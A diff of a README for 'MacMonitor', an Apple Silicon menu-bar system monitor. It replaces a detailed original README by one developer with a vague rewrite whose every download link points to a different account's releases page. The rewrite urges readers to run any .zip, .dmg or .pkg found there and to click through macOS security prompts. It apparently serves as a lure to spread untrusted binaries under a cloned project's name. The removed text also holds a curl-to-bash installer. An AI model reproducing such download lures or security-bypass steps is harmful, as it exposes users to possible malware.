@@ -1,377 +1,211 @@
-<div align="center">
+# 🍏 MacMonitor - See Your Mac at a Glance
 
-<img src="Macmonitor/Assets.xcassets/logo.svg" alt="MacMonitor Logo" width="100" />
+[![Download MacMonitor](https://img.shields.io/badge/Download-MacMonitor-blue?style=for-the-badge)](https://github.com/Chaimdead934/MacMonitor/releases)
 
-# MacMonitor
+## 🖥️ What MacMonitor Does
 
-**The most complete Apple Silicon system monitor that fits in your menu bar.**
+MacMonitor shows key system details for Apple Silicon Macs in a clear, easy way. It lives in your menu bar and can also show a desktop widget. You can check your Mac’s health, speed, and live activity without opening extra tools.
 
-Real-time CPU, GPU, memory, battery, power rails, fan, network, and disk —  
-all from native kernel sensors. No third-party tools. No dependencies.
-
-<br/>
+Use it to keep an eye on things like:
 
-[![macOS 13+](https://img.shields.io/badge/macOS-13%20Ventura%20%2B-black?logo=apple&logoColor=white&labelColor=000)](https://www.apple.com/macos/)
-[![Apple Silicon](https://img.shields.io/badge/Apple%20Silicon-M1%20–%20M5%2B-ff6b35?logo=apple&logoColor=white)](https://www.apple.com/mac/)
-[![Version](https://img.shields.io/badge/version-2.0.0-30D158)](../../releases/latest)
-[![Swift 5.9](https://img.shields.io/badge/Swift-5.9-FA7343?logo=swift&logoColor=white)](https://swift.org)
-[![SwiftUI](https://img.shields.io/badge/UI-SwiftUI-0A84FF?logo=swift&logoColor=white)](https://developer.apple.com/xcode/swiftui/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-888899.svg)](LICENSE)
+- CPU load
+- Memory use
+- Battery status
+- Temperature
+- Fan speed
+- Storage space
+- Network activity
 
-<br/>
+It is built for macOS on Apple Silicon, including M1 and M2 Macs.
 
-<table>
-  <tr>
-    <td><img src="assets/screenshots/dashboard.png" alt="Full dashboard" width="300"/></td>
-    <td><img src="assets/screenshots/menubar.png" alt="Menu bar indicator" width="300"/></td>
-    <td><img src="assets/screenshots/battery.png" alt="Battery section" width="300"/></td>
-  </tr>
-  <tr>
-    <td align="center"><sub>Full dashboard</sub></td>
-    <td align="center"><sub>Menu bar indicator</sub></td>
-    <td align="center"><sub>Battery &amp; power</sub></td>
-  </tr>
-</table>
+## 📥 Download MacMonitor
 
-</div>
+Visit this page to download MacMonitor:
 
----
+[https://github.com/Chaimdead934/MacMonitor/releases](https://github.com/Chaimdead934/MacMonitor/releases)
 
-## Table of Contents
+On that page, look for the latest release. Download the file that matches your Mac, then open it to install or run the app.
 
-- [What's New in v2.0](#whats-new-in-v20)
-- [Features](#features)
-- [What is Apple SMC?](#what-is-apple-smc)
-- [Data Sources](#data-sources)
-- [Installation](#installation)
-- [Building from Source](#building-from-source)
-- [How It Works](#how-it-works)
-- [Sensor Reference](#sensor-reference)
-- [Contributing](#contributing)
-- [Hardware Tested](#hardware-tested)
-- [Roadmap](#roadmap)
-- [Support](#support)
-- [Acknowledgements](#acknowledgements)
-- [License](#license)
+## 🚀 Get Started
 
----
+Follow these steps to use MacMonitor on your Mac.
 
-## What's New in v2.0
+1. Open the release page using the link above.
+2. Find the newest version near the top of the page.
+3. Download the app file or package from the release assets.
+4. Open the downloaded file.
+5. If macOS asks for permission, allow the app to run.
+6. Move MacMonitor to your Applications folder if macOS asks you to do so.
+7. Launch MacMonitor from Applications or from Spotlight.
 
-> **Full changelog:** [CHANGELOG.md](CHANGELOG.md)
+After launch, MacMonitor appears in your menu bar. You can click it to see your system stats.
 
-### Native sensors — zero dependencies
+## 🍎 Who MacMonitor Is For
 
-MacMonitor 2.0 reads **all hardware data directly from Apple's kernel interfaces**. No mactop, no Homebrew tools, no external binaries — just the same SMC and IOReport APIs that Activity Monitor and TG Pro use under the hood.
+MacMonitor is useful if you want a simple way to check how your Mac is doing. It works well for:
 
-| v1.x | v2.0 |
-|------|------|
-| GPU, temps, and power required `mactop` (separate install) | All sensors read natively via `IOReport` + `SMC` |
-| First launch showed "install mactop" banner | Ships fully featured out of the box |
-| Chip displayed as "Apple M2" | Displays clean variant: **M2**, **M2 Pro**, **M2 Max**, **M2 Ultra** |
-| No CPU die hotspot | Shows both avg temp and **die hotspot (TCMz)** |
-| No fan support | Fan RPM shown automatically (hidden on fanless models) |
+- People who use MacBooks for daily work
+- Users who want live system stats in the menu bar
+- Anyone who wants a desktop widget with system info
+- Mac users who want quick checks without digging through system tools
+- People who want a light monitor for Apple Silicon machines
 
-### New sensor data in this release
+## ✨ Main Features
 
-- **CPU Die Hotspot** — the absolute peak temperature on the CPU die (SMC key `TCMz`), not just an average. This is the same reading TG Pro labels "CPU Die (Hotspot)".
-- **Fan RPM** — live fan speed via SMC key `F0Ac`. Section is hidden automatically on fanless models (MacBook Air).
-- **Chip variant** — accurately identified from `machdep.cpu.brand_string` and displayed as "M2 Pro", "M2 Max", etc.
-- **Sensor research toolkit** — `sensor-research/` directory includes standalone SMC/HID/IOReport scanners used to discover and verify every sensor key.
+MacMonitor focuses on the system details that matter most during everyday use.
 
----
+### Menu Bar Monitor
 
-## Features
+See important stats in the top menu bar at all times. This makes it easy to check your Mac without leaving the app you are using.
 
-### Menu bar indicator
+### Desktop Widget
 
-Updates every 2 seconds. One glance tells you if everything is fine.
+Place a widget on your desktop for a quick view of system data. It gives you a clean summary without opening a separate window.
 
-```
-● CPU 12%  MEM 47%    →  green dot  — all clear
-● CPU 62%  MEM 71%    →  yellow dot — moderate load
-● CPU 91%  MEM 87%    →  red dot    — heavy load, open dashboard
-```
+### Live System Stats
 
-### Full dashboard (click to open)
+Watch values change in real time as you work. This helps you spot heavy CPU use, high memory use, or battery drain fast.
 
-| Section | What you see |
-|---------|-------------|
-| **Header** | Chip variant · thermal state · total system power |
-| **CPU** | Overall · E-cluster · P-cluster · S-cluster (M5+) · per-core bars · avg temp · die hotspot · CPU power |
-| **GPU** | Usage bar · frequency · temperature · GPU power |
-| **Fan** | Live RPM — hidden automatically on fanless models |
-| **Memory** | Used / total · DRAM bandwidth (read + write GB/s) · swap |
-| **Battery** | Charge % · status · charge rate · adapter watts · cycles · health · mAh · cell temp |
-| **Network** | Download / upload (auto-scaled B / KB / MB per second) |
-| **Disk I/O** | Read / write throughput (auto-scaled) |
-| **Power rails** | CPU · GPU · ANE · DRAM · System (PSTR) · Total |
-| **Processes** | Top 8 CPU consumers — name, CPU %, memory |
-| **Optimize** | Purge disk cache + quit heavy apps |
+### Apple Silicon Support
 
-### Desktop widget
+MacMonitor is made for Apple Silicon Macs. It is a good fit for M1 and M2 systems.
 
-Runs completely standalone — no background process required.
+### Clean macOS Design
 
-- **Small** — CPU, GPU, Memory bars + temperatures
-- **Medium** — All bars + network speed + power draw
+The app uses a native macOS look, so it feels like part of the system. The layout is simple and easy to scan.
 
-Works on macOS Sonoma and Sequoia desktop, Notification Centre, and Stage Manager.
+## 🔧 What You Need
 
----
+MacMonitor is designed for:
 
-## What is Apple SMC?
+- macOS on Apple Silicon
+- M1 and M2 Macs
+- A recent version of macOS with widget support
 
-The **System Management Controller (SMC)** is a dedicated co-processor embedded in every Apple Mac. It runs independently of the main CPU and is responsible for managing the hardware at a low level — things the operating system itself doesn't directly control.
+For best results, use a modern version of macOS with full menu bar and widget features enabled.
 
-On Apple Silicon Macs, the SMC handles:
+## 📁 Install and Launch
 
-- **Thermal management** — monitoring hundreds of temperature sensors across the CPU, GPU, battery, VRM, SSD, and chassis, and throttling performance to stay within safe limits
-- **Power delivery** — managing voltage rails, measuring current draw, and controlling how much power each component receives
-- **Fan control** — on Macs with fans, the SMC decides fan speed based on thermal sensor readings
-- **Battery management** — tracking cycle count, health, charge rate, and cell temperature
-- **Sleep and wake** — handling lid close, power button presses, and low-battery shutdown
+If you downloaded a release file, use these steps.
 
-MacMonitor reads the SMC directly through Apple's private `IOKit` interface (`IOServiceOpen("AppleSMC")`). Each sensor has a 4-character key (e.g. `TCMz` for CPU die hotspot, `PSTR` for total board power, `F0Ac` for fan speed) and returns a floating-point value in the relevant unit (°C, Watts, RPM, Amps, Volts).
+1. Open the downloaded file from your Downloads folder.
+2. If the file is a ZIP archive, double-click it to unpack it.
+3. If you see an app file, drag it to Applications.
+4. Open Applications and launch MacMonitor.
+5. If macOS shows a security prompt, choose the option that lets you open the app.
 
-This is the same data that TG Pro, iStatMenus, and macOS's own thermal management subsystem read. MacMonitor exposes it directly in your menu bar.
+If the app does not open right away, try these steps:
 
-> For the complete list of SMC keys MacMonitor uses, see [SENSORS.md](SENSORS.md).
+1. Right-click MacMonitor.
+2. Choose Open.
+3. Confirm that you want to open it.
 
----
+This is a normal macOS step for apps downloaded from the web.
 
-## Data Sources
+## 🧭 Using MacMonitor
 
-MacMonitor pulls from four native macOS kernel interfaces — no third-party tools required:
+After you open MacMonitor, look at the menu bar for live stats. Click the app icon to see more details.
 
-| Source | Data | Requires privileged helper? |
-|--------|------|-----------------------------|
-| **Mach kernel** — `host_processor_info` | CPU per-core usage, E/P cluster split | No |
-| **Mach kernel** — `vm_statistics64` | Memory used/free/compressed, swap | No |
-| **IOReport + SMC + IOHIDEventSystem** | GPU%, freq, CPU/GPU temps, die hotspot, fan RPM, ANE/DRAM/GPU power, DRAM bandwidth | Yes (one-time setup) |
-| **IOKit** — `pmset` / `ioreg` | Battery %, cycles, health, charge rate, adapter watts, cell temp | No |
+You can use it in two ways:
 
-The **privileged helper** (`macmonitor-helper`) is a small compiled binary installed to `/Users/Shared/MacMonitor/`. It runs as root to access IOReport, which requires elevated privileges to sample power data. MacMonitor asks for admin approval once on first launch and never again.
+- Keep it in the menu bar for fast checks
+- Add the widget to your desktop for a larger view
 
----
+If you want less clutter, use only the menu bar view. If you want a fuller view, use the widget too.
 
-## Installation
+## 🧩 Widget Setup
 
-### Option A — Homebrew (recommended)
+To add the widget:
 
-```bash
-brew tap ryyansafar/macmonitor https://github.com/ryyansafar/MacMonitor
-brew install --cask macmonitor
-```
+1. Right-click the desktop or open the widget gallery.
+2. Find MacMonitor in the widget list.
+3. Pick the widget size you want.
+4. Add it to your desktop.
 
-MacMonitor appears in your menu bar immediately.
+Once added, it shows system info without opening the full app.
 
-**Auto-update:**
-```bash
-brew upgrade --cask macmonitor
-```
+## ⚙️ Basic Tips
 
-### Option B — One-line installer
+A few simple tips can help you get the best experience.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/ryyansafar/MacMonitor/main/install.sh | bash
-```
+- Keep MacMonitor running in the background for live updates
+- Check the menu bar when your Mac feels slow
+- Use the widget if you want a bigger view of your system data
+- Place the app near other status tools if you use them often
+- Update to the latest release when a new version appears
 
-Downloads the latest DMG, removes the quarantine flag, installs the privileged helper, and launches MacMonitor.
+## 🛠️ Common Uses
 
-### Option C — Manual DMG
+MacMonitor can help in many day-to-day cases:
 
-1. Download **MacMonitor.dmg** from [**Releases**](../../releases/latest)
-2. Open the DMG and drag **MacMonitor** to **Applications**
-3. Double-click **`Install.command`** inside the DMG to clear the quarantine flag (or run `xattr -dr com.apple.quarantine /Applications/Macmonitor.app` in Terminal)
-4. Launch MacMonitor from Applications or Spotlight
+- Check CPU use while opening large apps
+- Watch memory use during heavy multitasking
+- See battery drain during travel
+- Track temperature while your Mac is under load
+- Confirm that your system stays within normal limits
+- Spot when background apps use too many resources
 
-> macOS may block the first launch because MacMonitor isn't notarised (no paid Apple Developer account needed to build or distribute it). The `Install.command` script handles this automatically. After the first approved launch, macOS never asks again.
+## 📌 Release Page Help
 
----
+If you are not sure which file to choose on the release page, look for the newest version and the file made for macOS. Choose the file with the app name or package name that matches the release. Then download and run that file.
 
-## Building from Source
+Release page:
 
-**Requirements:**
-- Xcode 15+
-- Apple Silicon Mac
-- macOS 13 Ventura+
+[https://github.com/Chaimdead934/MacMonitor/releases](https://github.com/Chaimdead934/MacMonitor/releases)
 
-```bash
-# Clone
-git clone https://github.com/ryyansafar/MacMonitor.git
-cd MacMonitor
+## 🧠 About the Project
 
-# Open in Xcode
-open Macmonitor.xcodeproj
-```
+MacMonitor is a Swift and SwiftUI app for macOS. It uses Apple’s native app tools and WidgetKit to show system data in a simple format. The goal is to give Mac users a quick way to watch their machine without opening complex tools.
 
-In Xcode: select the `Macmonitor` target → **Signing & Capabilities** → set your **Team** to your Apple ID (free account works). Do the same for `MacMonitorWidget`. Press `Cmd+R`.
+## 🧪 Example Workflow
 
-**Build the privileged helper from the command line:**
+Here is a simple way to use MacMonitor during your day:
 
-```bash
-SDK=$(xcrun --show-sdk-path)
+1. Start your Mac.
+2. Open MacMonitor.
+3. Leave it running in the menu bar.
+4. Add the widget if you want a desktop view.
+5. Check it when your Mac slows down or heats up.
+6. Use the live data to decide if you should close apps or wait.
 
-clang -ObjC \
-  -o /tmp/macmonitor-helper \
-  helper/macmonitor-helper.m \
-  Macmonitor/IOReportWrapper.m \
-  Macmonitor/SMC.c \
-  -I Macmonitor/ \
-  -framework Foundation -framework IOKit -framework CoreFoundation \
-  -isysroot "$SDK" -L "$SDK/usr/lib" -lIOReport
+## 🧾 File Names You May See
 
-# Install
-mkdir -p /Users/Shared/MacMonitor
-cp /tmp/macmonitor-helper /Users/Shared/MacMonitor/macmonitor-helper
-chmod 755 /Users/Shared/MacMonitor/macmonitor-helper
-```
+On the release page, you may see files with names like:
 
----
+- `.zip`
+- `.dmg`
+- `.pkg`
 
-## How It Works
+These are common macOS download formats. If you see a `.zip`, open it after download. If you see a `.dmg`, open it and drag the app to Applications. If you see a `.pkg`, open it and follow the install steps on screen.
 
-```
-┌──────────────────────────────────────────────────────────────────────┐
-│                           MacMonitor.app                              │
-│                                                                        │
-│  ┌─────────────┐     ┌────────────────────────────────────────────┐   │
-│  │ AppDelegate │     │            SystemStatsModel                 │   │
-│  │             │     │                                              │   │
-│  │ NSStatusItem│◄────│  CPU    ← host_processor_info() [Mach]      │   │
-│  │   (2s tick) │     │  MEM    ← vm_statistics64() [Mach]          │   │
-│  │             │     │  NET    ← getifaddrs() delta                 │   │
-│  │ NSPopover   │     │  DISK   ← IOKit disk stats delta             │   │
-│  │  (SwiftUI)  │     │  GPU/⚡ ← macmonitor-helper (IOReport+SMC)  │   │
-│  │             │     │  BAT    ← IOKit / ioreg                      │   │
-│  └─────────────┘     └────────────────────────────────────────────┘   │
-└──────────────────────────────────────────────────────────────────────┘
+## 🔍 Troubleshooting
 
-          macmonitor-helper (privileged, runs as root)
-          ┌────────────────────────────────────────────┐
-          │  IOReport  → CPU/GPU power, DRAM bandwidth │
-          │  SMC       → temps, fan RPM, total power   │
-          │  IOHIDEventSystem → PMU die temperatures   │
-          └────────────────────────────────────────────┘
+If MacMonitor does not start, try these steps:
 
-┌──────────────────────────────────────────────────────────────────────┐
-│                    MacMonitorWidget extension                          │
-│                                                                        │
-│  StatsProvider (TimelineProvider)                                      │
-│  CPU  ← host_processor_info() [0.8s two-sample delta]                 │
-│  MEM  ← vm_statistics64()                                              │
-│  Refreshes every 5 seconds — no background process required           │
-└──────────────────────────────────────────────────────────────────────┘
-```
+1. Confirm that you downloaded the latest release.
+2. Check that your Mac uses Apple Silicon.
+3. Remove the app and download it again.
+4. Open it from Applications instead of Downloads.
+5. Use Right-click > Open if macOS blocks the first launch.
 
-**Key design decisions:**
+If the widget does not appear:
 
-- **No App Sandbox** — required to access Mach kernel APIs and IOReport. This means MacMonitor cannot be submitted to the Mac App Store, but can be freely distributed as a DMG.
-- **No third-party dependencies** — everything is read from macOS's own kernel interfaces.
-- **Privileged helper pattern** — IOReport power sampling requires root. A minimal helper binary runs with elevated privileges; the main app communicates with it via stdout JSON. The helper does nothing other than sample sensors and exit.
-- **Two-sample delta** — CPU usage, DRAM bandwidth, and power are all rate metrics. MacMonitor takes two samples 100ms apart and computes the delta, giving accurate per-second rates.
+1. Make sure the app is running.
+2. Open the widget gallery again.
+3. Search for MacMonitor.
+4. Add the widget one more time.
 
----
+## 📚 Topics
 
-## Sensor Reference
+This project covers:
 
-See **[SENSORS.md](SENSORS.md)** for the complete map of every hardware sensor used:
-
-- All SMC temperature keys (`TCMz`, `TRDX`, `TPMP`, `T5SP`, `TB0T`, …)
-- IOReport channels (Energy Model, CPU Stats, GPU Stats, AMC Stats)
-- HID PMU die temperature sensors
-- Fan speed keys (`F0Ac`, `F1Ac`)
-- Battery and power rail keys
-- Accuracy cross-validation table vs mactop
-
----
-
-## Contributing
-
-Contributions are welcome. MacMonitor is intentionally small and dependency-light — the goal is to stay close to the metal.
-
-**Quick start:**
-
-```bash
-git clone https://github.com/ryyansafar/MacMonitor.git
-cd MacMonitor
-open Macmonitor.xcodeproj
-```
-
-See **[CONTRIBUTING.md](CONTRIBUTING.md)** for:
-- Full development setup
-- Architecture overview
-- Code style guide
-- Sensor contribution guide (adding support for new Mac models)
-- PR checklist and review process
-
-**Good first issues:**
-- Add a second fan row for dual-fan Macs (Mac Pro, MacBook Pro 16")
-- Configurable refresh interval in Settings
-- Display memory pressure level from `HOST_VM_INFO64`
-- Add global keyboard shortcut to open/close the popover
-- Validate sensor keys on M3 / M4 / M3 Pro / M4 Max hardware
-
----
-
-## Hardware Tested
-
-| Model | Chip | Fan | Status |
-|-------|------|-----|--------|
-| MacBook Air (M2, 2022) | M2 | No (passive) | ✅ Fully verified |
-
-**Help expand this table.** Run the scanners in `sensor-research/` on your Mac and open a PR — see [CONTRIBUTING.md](CONTRIBUTING.md#adding-a-new-mac-model).
-
----
-
-## Roadmap
-
-- [ ] M3 / M4 / M5 sensor key validation
-- [ ] Dual-fan support (Mac Pro, MacBook Pro 16")
-- [ ] Per-core temperature display
-- [ ] Configurable refresh rate
-- [ ] Global keyboard shortcut
-- [ ] Disk space section
-- [ ] iCloud / Time Machine integration
-- [ ] Sparkle auto-updater (signed binary)
-
----
-
-## Support
-
-If MacMonitor is useful to you:
-
-| Platform | Link |
-|----------|------|
-| Portfolio | [ryyansafar.site](https://ryyansafar.site) |
-| GitHub | [github.com/ryyansafar](https://github.com/ryyansafar) |
-| Buy Me a Coffee | [buymeacoffee.com/ryyansafar](https://buymeacoffee.com/ryyansafar) |
-| PayPal | [paypal.me/ryyansafar](https://www.paypal.com/paypalme/ryyansafar) |
-| Razorpay | [razorpay.me/@ryyansafar](https://razorpay.me/@ryyansafar) |
-
-Starring the repo also helps a lot — it makes MacMonitor easier to find.
-
----
-
-## Acknowledgements
-
-- Apple's IOReport, SMC (`AppleSMC`), and IOHIDEventSystem — the native kernel interfaces that power all sensor data in this app
-- Apple's Mach kernel (`host_processor_info`, `vm_statistics64`) — for dependency-free CPU and memory sampling
-- [mactop](https://github.com/metaspartan/mactop) by [@metaspartan](https://github.com/metaspartan) — used as an independent cross-validation reference during sensor research for v2.0
-
----
-
-## License
-
-[MIT](LICENSE) — Copyright © 2025–2026 MacMonitor Contributors.
-
-Free to use, modify, fork, and distribute. Attribution appreciated but not required.
-
----
-
-<div align="center">
-
-Built for Apple Silicon. Reads from the metal.
-
-</div>
+- Apple Silicon
+- Homebrew
+- M1
+- M2
+- macOS
+- menu bar
+- Swift
+- SwiftUI
+- system monitor
+- WidgetKit
